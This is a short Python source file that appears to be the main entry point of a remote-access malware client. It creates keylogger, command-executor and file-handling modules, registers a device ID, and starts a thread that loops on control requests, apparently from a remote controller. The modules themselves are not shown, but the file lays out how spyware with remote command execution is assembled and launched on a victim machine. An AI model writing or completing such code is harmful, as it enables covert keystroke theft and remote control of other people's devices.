#! /usr/bin/python3

import threading

from requestMethods.requestMethods import *

from modules.keylogger import *
from modules.cmdexecutor import *
from modules.files import *

from functions.start_functions import doStartStuff

from state.state import State

from _main.main_controller import MainController


print('Client is running...\n')

stateInstance = State()

keyloggerInstance = Keylogger(stateInstance)
cmdexecInstance = CMDExecutor(stateInstance)
filesInstance = FilesModule(stateInstance)

_deviceId = doStartStuff()


stateInstance.setState('deviceId', _deviceId)

stateInstance.setState('keyloggerInstance', keyloggerInstance)
stateInstance.setState('cmdexecInstance', cmdexecInstance)
stateInstance.setState('filesInstance', filesInstance)

mainControllerInstance = MainController(stateInstance)

_x1 = threading.Thread(target=mainControllerInstance.setControlRequestLoop)
_x1.start()


while True:
	pass
